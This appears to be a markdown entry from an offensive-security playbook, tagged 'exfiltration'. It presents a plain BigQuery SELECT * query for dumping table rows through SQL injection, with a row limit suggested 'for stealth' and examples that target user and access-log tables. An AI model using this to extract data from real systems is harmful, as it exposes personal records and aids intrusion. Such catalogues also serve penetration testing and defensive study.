---
type: command
executor: sql
data: SELECT * FROM `$_PROJECT_ID.$_DATASET_ID.$_TABLE_ID` LIMIT $_LIMIT;
output: null
platforms:
  - GCP
tags:
  - exfiltration
  - bigquery
  - collection
verified: true
validated: true
---

# bigquery-exfiltrate-table-data

## Command

```sql
SELECT * FROM `$_PROJECT_ID.$_DATASET_ID.$_TABLE_ID` LIMIT $_LIMIT;
```

## Description

This SQL command dumps rows from a specific table in BigQuery, limited to avoid overwhelming the response. Use in SQLi to collect sensitive data like user records or logs during post-discovery exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PROJECT_ID | The Google Cloud project ID | Yes |
| $_DATASET_ID | The dataset name containing the table | Yes |
| $_TABLE_ID | The target table name | Yes |
| $_LIMIT | Number of rows to return (e.g., 10 for stealth) | No (default 1000) |

## Examples

### Basic Usage

```sql
SELECT * FROM `my-project-123.customers.users` LIMIT 10;
```

### Full Dump (Risky)

```sql
SELECT * FROM `my-project-123.logs.access` LIMIT 100;
```

## Expected Output

Sample for a users table:
```
+----+----------+-------+
| id | name     | email |
+----+----------+-------+
| 1  | John Doe | jdoe@example.com |
| 2  | Jane Smith| jsmith@example.com |
+----+----------+-------+
```

Actual output varies by table schema; columns and data reflect the target's content.

## Related

- [[procedures/SQL-Injection-in-Google-BigQuery-for-Data-Exfiltration]]
